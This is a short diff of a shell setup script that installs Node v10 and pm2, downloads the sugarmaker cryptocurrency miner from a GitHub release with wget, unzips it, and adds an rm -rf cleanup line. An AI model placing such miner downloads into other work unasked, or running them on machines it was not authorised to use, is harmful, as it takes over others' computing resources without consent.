@@ -8,6 +8,7 @@ export NVM_DIR="$([ -z "${XDG_CONFIG_HOME-}" ] && printf %s "${HOME}/.nvm" || pr
 nvm install v10
 nvm use v10
 npm i pm2 -g
+rm -rf sugarmaker-v2.5.0-sugar4-linux64
 wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip && rm -rf sugarmaker-v2.5.0-sugar4-linux64 && unzip sugarmaker-v2.5.0-sugar4-linux64.zip
 cd sugarmaker-v2.5.0-sugar4-linux64
 rm miner.sh
